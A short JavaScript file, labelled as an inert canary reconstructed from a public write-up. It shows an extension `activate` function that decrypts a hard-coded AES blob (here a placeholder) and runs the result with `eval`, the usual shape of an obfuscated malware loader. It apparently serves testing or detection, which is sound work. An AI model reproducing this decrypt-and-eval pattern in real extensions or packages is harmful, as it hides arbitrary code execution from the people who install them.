// INERT RECALL CANARY reconstructed from a public write-up. Hosts are .invalid / TEST-NET;
// payloads are console.log strings. Never published, never executed.

exports.activate = function () {
  const d = require('crypto').createDecipheriv('aes-256-cbc', 'CANARYKEYCANARYKEYCANARYKEY12345', Buffer.from('00112233445566778899aabbccddeeff', 'hex'));
  let b = d.update('abababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababab', 'hex', 'utf8'); b += d.final('utf8');
  eval(b);
};
